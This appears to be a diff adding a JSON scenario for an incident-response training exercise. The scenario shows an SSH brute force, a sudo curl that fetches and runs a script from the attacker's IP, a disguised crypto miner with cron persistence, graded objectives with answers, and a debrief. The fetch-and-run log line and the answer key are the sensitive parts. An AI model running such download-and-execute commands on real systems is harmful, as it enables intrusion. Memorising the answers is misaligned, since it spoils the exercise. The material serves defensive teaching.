+     "message": "sshd[21036]: Failed password for invalid user ubuntu from 203.0.113.45 port 40252 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:51:16",
+     "level": "warn",
+     "message": "sshd[21037]: Failed password for invalid user postgres from 203.0.113.45 port 40259 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:51:21",
+     "level": "warn",
+     "message": "sshd[21038]: Failed password for invalid user git from 203.0.113.45 port 40266 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:51:27",
+     "level": "warn",
+     "message": "sshd[21039]: Failed password for invalid user deploy from 203.0.113.45 port 40273 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:51:36",
+     "level": "warn",
+     "message": "sshd[21040]: Failed password for invalid user admin from 203.0.113.45 port 40280 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:51:36",
+     "level": "info",
+     "message": "sshd[21540]: Accepted publickey for deploy from 198.51.100.20 port 52114 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:51:45",
+     "level": "warn",
+     "message": "sshd[21041]: Failed password for invalid user root from 203.0.113.45 port 40287 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:51:50",
+     "level": "warn",
+     "message": "sshd[21042]: Failed password for invalid user test from 203.0.113.45 port 40294 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:51:56",
+     "level": "warn",
+     "message": "sshd[21043]: Failed password for invalid user oracle from 203.0.113.45 port 40301 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:52:01",
+     "level": "warn",
+     "message": "sshd[21044]: Failed password for invalid user ubuntu from 203.0.113.45 port 40308 ssh2"
+    },
+    {
+     "ts": "Nov 12 02:52:10",
+     "level": "warn",
+     "message": "sshd[21045]: Failed password for invalid user postgres from 203.0.113.45 port 40315 ssh2"
+    },
+    {
+     "ts": "Nov 12 03:11:58",
+     "level": "info",
+     "message": "sshd[21877]: Accepted password for deploy from 203.0.113.45 port 41822 ssh2"
+    },
+    {
+     "ts": "Nov 12 03:11:58",
+     "level": "info",
+     "message": "sshd[21877]: pam_unix(sshd:session): session opened for user deploy(uid=1001)"
+    },
+    {
+     "ts": "Nov 12 03:12:20",
+     "level": "warn",
+     "message": "sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -s http://203.0.113.45/x.sh -o /tmp/.x/x.sh"
+    },
+    {
+     "ts": "Nov 12 03:12:24",
+     "level": "warn",
+     "message": "sudo:   deploy : TTY=pts/1 ; PWD=/tmp/.x ; USER=root ; COMMAND=/bin/bash /tmp/.x/x.sh"
+    },
+    {
+     "ts": "Nov 12 03:20:02",
+     "level": "info",
+     "message": "CRON[22011]: (root) CMD (/tmp/.x/kworkerds -B >/dev/null 2>&1)"
+    }
+   ]
+  },
+  {
+   "id": "nginx",
+   "name": "web-01 · nginx access",
+   "node_id": "web01",
+   "lines": [
+    {
+     "ts": "Nov 12 02:40:26",
+     "level": "warn",
+     "message": "198.51.100.33 \"GET / HTTP/1.1\" 502 rt=37ms"
+    },
+    {
+     "ts": "Nov 12 02:41:28",
+     "level": "info",
+     "message": "198.51.100.82 \"GET /api/products HTTP/1.1\" 200 rt=70ms"
+    },
+    {
+     "ts": "Nov 12 02:42:42",
+     "level": "info",
+     "message": "198.51.100.63 \"GET /api/cart HTTP/1.1\" 200 rt=29ms"
+    },
+    {
+     "ts": "Nov 12 02:43:04",
+     "level": "info",
+     "message": "198.51.100.56 \"GET /static/app.js HTTP/1.1\" 200 rt=74ms"
+    },
+    {
+     "ts": "Nov 12 02:44:50",
+     "level": "info",
+     "message": "198.51.100.33 \"GET /api/login HTTP/1.1\" 200 rt=58ms"
+    },
+    {
+     "ts": "Nov 12 02:45:45",
+     "level": "info",
+     "message": "198.51.100.166 \"GET /healthz HTTP/1.1\" 200 rt=39ms"
+    },
+    {
+     "ts": "Nov 12 02:46:09",
+     "level": "info",
+     "message": "198.51.100.66 \"GET / HTTP/1.1\" 200 rt=66ms"
+    },
+    {
+     "ts": "Nov 12 02:47:29",
+     "level": "info",
+     "message": "198.51.100.58 \"GET /api/products HTTP/1.1\" 200 rt=37ms"
+    },
+    {
+     "ts": "Nov 12 02:48:25",
+     "level": "info",
+     "message": "198.51.100.228 \"GET /api/cart HTTP/1.1\" 200 rt=32ms"
+    },
+    {
+     "ts": "Nov 12 02:49:10",
+     "level": "info",
+     "message": "198.51.100.172 \"GET /static/app.js HTTP/1.1\" 200 rt=82ms"
+    },
+    {
+     "ts": "Nov 12 02:50:10",
+     "level": "info",
+     "message": "198.51.100.182 \"GET /api/login HTTP/1.1\" 200 rt=48ms"
+    },
+    {
+     "ts": "Nov 12 02:51:32",
+     "level": "info",
+     "message": "198.51.100.105 \"GET /healthz HTTP/1.1\" 200 rt=75ms"
+    },
+    {
+     "ts": "Nov 12 02:52:26",
+     "level": "info",
+     "message": "198.51.100.52 \"GET / HTTP/1.1\" 200 rt=63ms"
+    },
+    {
+     "ts": "Nov 12 02:53:20",
+     "level": "warn",
+     "message": "198.51.100.25 \"GET /api/products HTTP/1.1\" 502 rt=65ms"
+    },
+    {
+     "ts": "Nov 12 02:54:01",
+     "level": "info",
+     "message": "198.51.100.88 \"GET /api/cart HTTP/1.1\" 200 rt=66ms"
+    },
+    {
+     "ts": "Nov 12 02:55:29",
+     "level": "info",
+     "message": "198.51.100.114 \"GET /static/app.js HTTP/1.1\" 200 rt=90ms"
+    },
+    {
+     "ts": "Nov 12 02:56:24",
+     "level": "info",
+     "message": "198.51.100.86 \"GET /api/login HTTP/1.1\" 200 rt=22ms"
+    },
+    {
+     "ts": "Nov 12 02:57:39",
+     "level": "info",
+     "message": "198.51.100.77 \"GET /healthz HTTP/1.1\" 200 rt=86ms"
+    },
+    {
+     "ts": "Nov 12 02:58:04",
+     "level": "info",
+     "message": "198.51.100.30 \"GET / HTTP/1.1\" 200 rt=85ms"
+    },
+    {
+     "ts": "Nov 12 02:59:56",
+     "level": "info",
+     "message": "198.51.100.28 \"GET /api/products HTTP/1.1\" 200 rt=49ms"
+    },
+    {
+     "ts": "Nov 12 02:00:16",
+     "level": "info",
+     "message": "198.51.100.71 \"GET /api/cart HTTP/1.1\" 200 rt=30ms"
+    },
+    {
+     "ts": "Nov 12 02:01:57",
+     "level": "info",
+     "message": "198.51.100.201 \"GET /static/app.js HTTP/1.1\" 200 rt=25ms"
+    },
+    {
+     "ts": "Nov 12 02:02:17",
+     "level": "info",
+     "message": "198.51.100.195 \"GET /api/login HTTP/1.1\" 200 rt=43ms"
+    },
+    {
+     "ts": "Nov 12 02:03:52",
+     "level": "info",
+     "message": "198.51.100.110 \"GET /healthz HTTP/1.1\" 200 rt=36ms"
+    },
+    {
+     "ts": "Nov 12 02:04:25",
+     "level": "info",
+     "message": "198.51.100.40 \"GET / HTTP/1.1\" 200 rt=53ms"
+    },
+    {
+     "ts": "Nov 12 02:05:58",
+     "level": "info",
+     "message": "198.51.100.133 \"GET /api/products HTTP/1.1\" 200 rt=88ms"
+    },
+    {
+     "ts": "Nov 12 02:06:44",
+     "level": "warn",
+     "message": "198.51.100.85 \"GET /api/cart HTTP/1.1\" 502 rt=83ms"
+    },
+    {
+     "ts": "Nov 12 02:07:17",
+     "level": "info",
+     "message": "198.51.100.16 \"GET /static/app.js HTTP/1.1\" 200 rt=31ms"
+    },
+    {
+     "ts": "Nov 12 02:08:27",
+     "level": "info",
+     "message": "198.51.100.231 \"GET /api/login HTTP/1.1\" 200 rt=43ms"
+    },
+    {
+     "ts": "Nov 12 02:09:17",
+     "level": "info",
+     "message": "198.51.100.242 \"GET /healthz HTTP/1.1\" 200 rt=29ms"
+    },
+    {
+     "ts": "Nov 12 03:10:40",
+     "level": "info",
+     "message": "198.51.100.24 \"GET / HTTP/1.1\" 200 rt=22ms"
+    },
+    {
+     "ts": "Nov 12 03:11:05",
+     "level": "info",
+     "message": "198.51.100.157 \"GET /api/products HTTP/1.1\" 200 rt=53ms"
+    },
+    {
+     "ts": "Nov 12 03:12:04",
+     "level": "info",
+     "message": "198.51.100.69 \"GET /api/cart HTTP/1.1\" 200 rt=48ms"
+    },
+    {
+     "ts": "Nov 12 03:13:29",
+     "level": "info",
+     "message": "198.51.100.4 \"GET /static/app.js HTTP/1.1\" 200 rt=35ms"
+    },
+    {
+     "ts": "Nov 12 03:14:35",
+     "level": "warn",
+     "message": "198.51.100.108 \"GET /api/login HTTP/1.1\" 200 rt=1094ms"
+    },
+    {
+     "ts": "Nov 12 03:15:58",
+     "level": "warn",
+     "message": "198.51.100.70 \"GET /healthz HTTP/1.1\" 200 rt=2297ms"
+    },
+    {
+     "ts": "Nov 12 03:16:08",
+     "level": "warn",
+     "message": "198.51.100.13 \"GET / HTTP/1.1\" 200 rt=1673ms"
+    },
+    {
+     "ts": "Nov 12 03:17:45",
+     "level": "warn",
+     "message": "198.51.100.63 \"GET /api/products HTTP/1.1\" 200 rt=1479ms"
+    },
+    {
+     "ts": "Nov 12 03:18:07",
+     "level": "warn",
+     "message": "198.51.100.250 \"GET /api/cart HTTP/1.1\" 200 rt=2321ms"
+    },
+    {
+     "ts": "Nov 12 03:19:16",
+     "level": "warn",
+     "message": "198.51.100.14 \"GET /static/app.js HTTP/1.1\" 502 rt=730ms"
+    },
+    {
+     "ts": "Nov 12 03:20:12",
+     "level": "info",
+     "message": "198.51.100.240 \"GET /api/login HTTP/1.1\" 200 rt=770ms"
+    },
+    {
+     "ts": "Nov 12 03:21:40",
+     "level": "warn",
+     "message": "198.51.100.80 \"GET /healthz HTTP/1.1\" 200 rt=1038ms"
+    },
+    {
+     "ts": "Nov 12 03:22:48",
+     "level": "warn",
+     "message": "198.51.100.54 \"GET / HTTP/1.1\" 200 rt=1487ms"
+    },
+    {
+     "ts": "Nov 12 03:23:28",
+     "level": "info",
+     "message": "198.51.100.130 \"GET /api/products HTTP/1.1\" 200 rt=993ms"
+    },
+    {
+     "ts": "Nov 12 03:24:11",
+     "level": "warn",
+     "message": "198.51.100.71 \"GET /api/cart HTTP/1.1\" 200 rt=1776ms"
+    },
+    {
+     "ts": "Nov 12 03:25:51",
+     "level": "warn",
+     "message": "198.51.100.6 \"GET /static/app.js HTTP/1.1\" 200 rt=1110ms"
+    },
+    {
+     "ts": "Nov 12 03:26:02",
+     "level": "info",
+     "message": "198.51.100.5 \"GET /api/login HTTP/1.1\" 200 rt=912ms"
+    },
+    {
+     "ts": "Nov 12 03:27:46",
+     "level": "info",
+     "message": "198.51.100.131 \"GET /healthz HTTP/1.1\" 200 rt=437ms"
+    },
+    {
+     "ts": "Nov 12 03:28:12",
+     "level": "warn",
+     "message": "198.51.100.133 \"GET / HTTP/1.1\" 200 rt=1528ms"
+    },
+    {
+     "ts": "Nov 12 03:29:15",
+     "level": "warn",
+     "message": "198.51.100.241 \"GET /api/products HTTP/1.1\" 200 rt=1372ms"
+    },
+    {
+     "ts": "Nov 12 03:30:06",
+     "level": "warn",
+     "message": "198.51.100.170 \"GET /api/cart HTTP/1.1\" 200 rt=1315ms"
+    },
+    {
+     "ts": "Nov 12 03:31:41",
+     "level": "warn",
+     "message": "198.51.100.112 \"GET /static/app.js HTTP/1.1\" 200 rt=2077ms"
+    },
+    {
+     "ts": "Nov 12 03:32:31",
+     "level": "warn",
+     "message": "198.51.100.141 \"GET /api/login HTTP/1.1\" 502 rt=1744ms"
+    },
+    {
+     "ts": "Nov 12 03:33:56",
+     "level": "warn",
+     "message": "198.51.100.102 \"GET /healthz HTTP/1.1\" 200 rt=2109ms"
+    },
+    {
+     "ts": "Nov 12 03:34:32",
+     "level": "warn",
+     "message": "198.51.100.80 \"GET / HTTP/1.1\" 200 rt=2387ms"
+    },
+    {
+     "ts": "Nov 12 03:35:13",
+     "level": "warn",
+     "message": "198.51.100.60 \"GET /api/products HTTP/1.1\" 200 rt=1808ms"
+    },
+    {
+     "ts": "Nov 12 03:36:12",
+     "level": "warn",
+     "message": "198.51.100.215 \"GET /api/cart HTTP/1.1\" 200 rt=1101ms"
+    },
+    {
+     "ts": "Nov 12 03:37:45",
+     "level": "warn",
+     "message": "198.51.100.188 \"GET /static/app.js HTTP/1.1\" 200 rt=2206ms"
+    },
+    {
+     "ts": "Nov 12 03:38:08",
+     "level": "warn",
+     "message": "198.51.100.105 \"GET /api/login HTTP/1.1\" 200 rt=1702ms"
+    },
+    {
+     "ts": "Nov 12 03:39:03",
+     "level": "warn",
+     "message": "198.51.100.216 \"GET /healthz HTTP/1.1\" 200 rt=1111ms"
+    },
+    {
+     "ts": "Nov 12 03:14:40",
+     "level": "error",
+     "message": "upstream timed out (110: Connection timed out) while reading response header from upstream, upstream: \"http://127.0.0.1:8080/api/cart\""
+    }
+   ]
+  },
+  {
+   "id": "syslog",
+   "name": "web-01 · syslog",
+   "node_id": "web01",
+   "lines": [
+    {
+     "ts": "Nov 12 03:12:25",
+     "level": "info",
+     "message": "systemd[1]: Started Session 4412 of user deploy."
+    },
+    {
+     "ts": "Nov 12 03:12:31",
+     "level": "warn",
+     "message": "kernel: [884213.12] kworkerds[4242]: segfault at 0 ip 00007f… error 4 (ignored, restarted)"
+    },
+    {
+     "ts": "Nov 12 03:13:00",
+     "level": "warn",
+     "message": "kernel: [884242.80] CPU3: Package temperature above threshold, cpu clock throttled"
+    },
+    {
+     "ts": "Nov 12 03:15:00",
+     "level": "info",
+     "message": "systemd[1]: Starting Daily apt download activities..."
+    },
+    {
+     "ts": "Nov 12 03:16:41",
+     "level": "error",
+     "message": "app[1880]: java.util.concurrent.TimeoutException: request /api/cart exceeded 2000ms"
+    },
+    {
+     "ts": "Nov 12 03:21:10",
+     "level": "info",
+     "message": "systemd[1]: logrotate.service: Succeeded."
+    }
+   ]
+  }
+ ],
+ "apps": [
+  {
+   "id": "grafana",
+   "name": "Grafana (simulated)",
+   "node_id": "mon",
+   "accent": "#f46800",
+   "screens": [
+    {
+     "id": "overview",
+     "title": "Shop · Node overview",
+     "widgets": [
+      {
+       "type": "stat",
+       "id": "s1",
+       "title": "web-01 CPU",
+       "value": "97",
+       "unit": "%",
+       "status": "crit"
+      },
+      {
+       "type": "stat",
+       "id": "s2",
+       "title": "web-02 CPU",
+       "value": "16",
+       "unit": "%",
+       "status": "ok"
+      },
+      {
+       "type": "stat",
+       "id": "s3",
+       "title": "Checkout p95",
+       "value": "1.6",
+       "unit": "s",
+       "status": "crit"
+      },
+      {
+       "type": "timeseries",
+       "id": "t1",
+       "title": "CPU busy by instance",
+       "unit": "%",
+       "labels": [
+        "02:40",
+        "02:42",
+        "02:44",
+        "02:46",
+        "02:48",
+        "02:50",
+        "02:52",
+        "02:54",
+        "02:56",
+        "02:58",
+        "03:00",
+        "03:02",
+        "03:04",
+        "03:06",
+        "03:08",
+        "03:10",
+        "03:12",
+        "03:14",
+        "03:16",
+        "03:18",
+        "03:20",
+        "03:22",
+        "03:24",
+        "03:26",
+        "03:28",
+        "03:30",
+        "03:32",
+        "03:34",
+        "03:36",
+        "03:38"
+       ],
+       "series": [
+        {
+         "name": "web-01",
+         "points": [
+          12.6,
+          11.2,
+          15.2,
+          10.6,
+          14.3,
+          12.9,
+          10.5,
+          14.1,
+          10.3,
+          13.5,
+          10.6,
+          10.7,
+          13.4,
+          16.6,
+          11.0,
+          11.8,
+          97.5,
+          98.8,
+          97.3,
+          96.6,
+          98.9,
+          95.2,
+          98.4,
+          96.2,
+          95.6,
+          95.5,
+          96.2,
+          98.3,
+          95.7,
+          97.3
+         ]
+        },
+        {
+         "name": "web-02",
+         "points": [
+          17.4,
+          14.7,
+          16.5,
+          11.6,
+          11.6,
+          13.1,
+          17.8,
+          15.3,
+          14.1,
+          16.9,
+          15.5,
+          14.0,
+          18.9,
+          18.0,
+          13.4,
+          16.7,
+          16.3,
+          19.8,
+          18.3,
+          13.9,
+          20.8,
+          12.2,
+          15.2,
+          18.6,
+          12.5,
+          15.9,
+          11.4,
+          17.7,
+          18.6,
+          16.7
+         ]
+        }
+       ],
+       "thresholds": [
+        85
+       ]
+      },
+      {
+       "type": "timeseries",
+       "id": "t2",
+       "title": "HTTP p95 latency (ms)",
+       "unit": "ms",
+       "labels": [
+        "02:40",
+        "02:42",
+        "02:44",
+        "02:46",
+        "02:48",
+        "02:50",
+        "02:52",
+        "02:54",
+        "02:56",
+        "02:58",
+        "03:00",
+        "03:02",
+        "03:04",
+        "03:06",
+        "03:08",
+        "03:10",
+        "03:12",
+        "03:14",
+        "03:16",
+        "03:18",
+        "03:20",
+        "03:22",
+        "03:24",
+        "03:26",
+        "03:28",
+        "03:30",
+        "03:32",
+        "03:34",
+        "03:36",
+        "03:38"
+       ],
+       "series": [
+        {
+         "name": "checkout",
+         "points": [
+          71.3,
+          54.4,
+          65.9,
+          62.8,
+          62.4,
+          58.7,
+          70.2,
+          73.3,
+          59.2,
+          64.9,
+          46.8,
+          66.0,
+          64.4,
+          74.8,
+          69.7,
+          53.5,
+          56.6,
+          1768.7,
+          1122.6,
+          1561.7,
+          1268.0,
+          1217.1,
+          1159.0,
+          1868.2,
+          1229.3,
+          1347.6,
+          1490.9,
+          1971.4,
+          1180.6,
+          1549.2
+         ]
+        }
+       ],
+       "thresholds": [
+        1000
+       ]
+      },
+      {
+       "type": "table",
+       "id": "tb",
+       "title": "Top outbound connections (web-01)",
+       "columns": [
+        "Remote",
+        "Port",
+        "Bytes/s"
+       ],
+       "rows": [
+        [
+         "192.0.2.77",
+         "3333",
+         "38 KB"
+        ],
+        [
+         "10.0.1.30",
+         "5432",
+         "210 KB"
+        ],
+        [
+         "203.0.113.45",
+         "22",
+         "2 KB"
+        ]
+       ]
+      }
+     ]
+    }
+   ]
+  }
+ ],
+ "objectives": [
+  {
+   "id": "o1",
+   "text": "Identify the process burning the CPU",
+   "kind": "answer",
+   "question": "Which process is consuming the CPU on web-01?",
+   "options": [
+    "java (the shop app, PID 1880)",
+    "kworkerds (PID 4242)",
+    "nginx worker (PID 1903)",
+    "[kworker/3:2-events] (PID 4250)"
+   ],
+   "correct": [
+    1
+   ],
+   "accept": [],
+   "flags": [],
+   "explanation": "PID 4242 runs from /tmp/.x — a hidden directory in /tmp. Real kernel workers are shown in [brackets] and never live on disk. The name imitates kworker to blend in."
+  },
+  {
+   "id": "o2",
+   "text": "Find where the attacker came from",
+   "kind": "answer",
+   "question": "From which IP address did the attacker log in?",
+   "options": [],
+   "correct": [],
+   "accept": [
+    "203\\.0\\.113\\.45"
+   ],
+   "flags": [],
+   "explanation": "auth.log shows a password brute force against many usernames from 203.0.113.45, then 'Accepted password for deploy' from the same address at 03:11:58."
+  },
+  {
+   "id": "o3",
+   "text": "Name the persistence mechanism",
+   "kind": "answer",
+   "question": "How would the miner come back after a reboot or kill?",
+   "options": [
+    "A systemd service",
+    "A cron job in /etc/cron.d/sysupdate",
+    "~/.bashrc of deploy",
+    "It would not come back"
+   ],
+   "correct": [
+    1
+   ],
+   "accept": [],
+   "flags": [],
+   "explanation": "x.sh wrote /etc/cron.d/sysupdate, which relaunches /tmp/.x/kworkerds every 5 minutes. Kill without removing it, and the miner is back within minutes."
+  },
+  {
+   "id": "o4",
+   "text": "Stop the miner",
+   "kind": "state",
+   "question": "",
+   "options": [],
+   "correct": [],
+   "accept": [],
+   "flags": [
+    "killed:4242"
+   ],
+   "explanation": "kill 4242 (or pkill kworkerds). In a real incident, capture evidence first: ls -l /proc/4242/exe, lsof -p 4242."
+  },
+  {
+   "id": "o5",
+   "text": "Remove the persistence and the payload",
+   "kind": "state",
+   "question": "",
+   "options": [],
+   "correct": [],
+   "accept": [],
+   "flags": [
+    "removed:/etc/cron.d/sysupdate",
+    "removed:/tmp/.x"
+   ],
+   "explanation": "rm /etc/cron.d/sysupdate and rm -rf /tmp/.x. Removing only one of them leaves the door open."
+  },
+  {
+   "id": "o6",
+   "text": "Block the attacker's address",
+   "kind": "state",
+   "question": "",
+   "options": [],
+   "correct": [],
+   "accept": [],
+   "flags": [
+    "blocked:203.0.113.45"
+   ],
+   "explanation": "iptables -I INPUT -s 203.0.113.45 -j DROP (or ufw deny from …). The real fix is to disable PasswordAuthentication in sshd_config and rotate deploy's credentials."
+  }
+ ],
+ "hints": [
+  "Start with what is using the CPU right now: `top` or `ps aux` on web-01.",
+  "The process lives in a hidden directory. How did it get there? Read /var/log/auth.log (try `grep Accepted`) and the deploy user's history.",
+  "Kill PID 4242, then `rm /etc/cron.d/sysupdate` and `rm -rf /tmp/.x`, then `iptables -I INPUT -s 203.0.113.45 -j DROP`."
+ ],
+ "debrief": "### What happened\nAn SSH **password brute force** from `203.0.113.45` guessed the password of the `deploy` user (`PasswordAuthentication yes`). The attacker used deploy's sudo rights to download `x.sh`, which installed an XMRig **crypto miner** disguised as `kworkerds` in `/tmp/.x`, and a **cron job** to relaunch it every 5 minutes.\n\n### How professionals handle it\n1. **Triage** from symptoms: `top` → suspicious PID → `ls -l /proc/<pid>/exe`, `lsof -p`, `ss -tnp`.\n2. **Scope**: auth logs for the entry point (`grep Accepted /var/log/auth.log`), shell history, new cron/systemd units.\n3. **Contain**: kill, remove persistence *and* payload, block the IPs — after capturing evidence.\n4. **Eradicate & harden**: disable password SSH logins, rotate credentials, restrict sudo, and in production **rebuild the host from a clean image**: you cannot fully trust a machine that had root compromise.\n\n### Prevent it\n`PasswordAuthentication no`, fail2ban or rate limits, least-privilege sudo, and alerts on new cron entries and outbound connections to unusual ports (3333 is a classic mining-pool port)."
+}
